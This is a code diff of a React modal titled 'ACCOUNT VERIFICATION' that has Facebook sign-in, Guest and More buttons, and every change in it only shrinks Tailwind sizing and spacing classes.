@@ -44,10 +44,10 @@ const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
         <div className="relative w-[90%] max-w-md aspect-[16/9] bg-black rounded-lg shadow-2xl overflow-hidden">
 
           {/* Topbar */}
-          <div className="absolute top-0 left-0 w-full flex justify-between items-center px-4 py-2 z-20 bg-white/80 backdrop-blur-sm">
-            <h2 className="text-sm font-semibold text-gray-800">ACCOUNT VERIFICATION</h2>
+          <div className="absolute top-0 left-0 w-full flex justify-between items-center px-3 py-1 z-20 bg-white/80 backdrop-blur-sm">
+            <h2 className="text-xs font-semibold text-gray-800">ACCOUNT VERIFICATION</h2>
             <button onClick={onClose}>
-              <X className="w-5 h-5 text-gray-500 hover:text-black" />
+              <X className="w-4 h-4 text-gray-500 hover:text-black" />
             </button>
           </div>
 
@@ -60,18 +60,18 @@ const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
           />
 
           {/* Buttons */}
-          <div className="absolute bottom-4 left-1/2 transform -translate-x-1/2 z-20 w-full px-4 flex flex-col items-center gap-2">
+          <div className="absolute bottom-3 left-1/2 transform -translate-x-1/2 z-20 w-full px-3 flex flex-col items-center gap-1.5">
             <button
               onClick={handleFacebookLogin}
-              className="w-[70%] bg-[#1877f2] text-white px-3 py-[6px] rounded-md shadow-md hover:bg-[#145dcc] text-[13px] font-medium"
+              className="w-[65%] bg-[#1877f2] text-white px-2 py-[4px] rounded-md shadow-md hover:bg-[#145dcc] text-[11px] font-semibold"
             >
               Sign in with Facebook
             </button>
-            <div className="flex w-[70%] justify-between gap-2">
-              <button className="flex-1 bg-white/90 border border-gray-400 text-black py-[6px] rounded-md shadow text-[12px] font-semibold">
+            <div className="flex w-[65%] justify-between gap-1">
+              <button className="flex-1 bg-white/90 border border-gray-400 text-black py-[4px] rounded-md shadow text-[10px] font-semibold">
                 👤 Guest
               </button>
-              <button className="flex-1 bg-white/90 border border-gray-400 text-black py-[6px] rounded-md shadow text-[12px] font-semibold">
+              <button className="flex-1 bg-white/90 border border-gray-400 text-black py-[4px] rounded-md shadow text-[10px] font-semibold">
                 ••• More
               </button>
             </div>
@@ -90,4 +90,4 @@ const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
 };
 
 export default AccessModal;
-              
+  
